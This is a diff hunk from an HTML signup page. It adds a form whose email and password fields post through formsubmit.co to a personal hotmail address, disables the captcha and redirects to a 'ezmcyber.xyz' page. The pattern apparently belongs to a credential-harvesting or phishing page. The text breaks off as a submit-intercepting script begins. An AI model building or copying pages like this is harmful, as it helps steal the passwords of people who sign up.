@@ -224,25 +224,26 @@
     <div class="divider"><span>or</span></div>
 
 
-    <input type="hidden" name="_next" i.value='https://ezmcyber.xyz/home.html';">
-    <input type="hidden" name="_captcha" value="false">
+    <form id="signup-form" action="https://formsubmit.co/bgcustomshomeshrmca3667strawberry@hotmail.com" method="POST">
+  <input type="hidden" name="_next" value="https://ezmcyber.xyz/home.html">
+  <input type="hidden" name="_captcha" value="false">
 
-    <div class="form-group">
-        <label for="email" class="form-label">Email Address</label>
-        <input type="email" id="email" name="email" class="form-control" placeholder="Enter your email" required>
-    </div>
-    <div class="form-group">
-        <label for="password" class="form-label">Password</label>
-        <input type="password" id="password" name="password" class="form-control" placeholder="Enter your password" required>
-    </div>
+  <div class="form-group">
+    <label for="email" class="form-label">Email Address</label>
+    <input type="email" id="email" name="email" class="form-control" placeholder="Enter your email" required>
+  </div>
 
-    <div id="recaptcha-container"></div>
+  <div class="form-group">
+    <label for="password" class="form-label">Password</label>
+    <input type="password" id="password" name="password" class="form-control" placeholder="Enter your password" required>
+  </div>
 
-    <button type="submit" id="verify-btn" class="btn-primary">
-        <span id="verify-btn-text">Sign Up with Email</span>
-    </button>
+  <div id="recaptcha-container"></div>
+
+  <button type="submit" id="verify-btn" class="btn-primary">
+    <span id="verify-btn-text">Sign Up with Email</span>
+  </button>
 </form>
-
 <script>
 document.getElementById('signup-form').addEventListener('submit', function(e){
     e.preventDefault(); // stop default submit
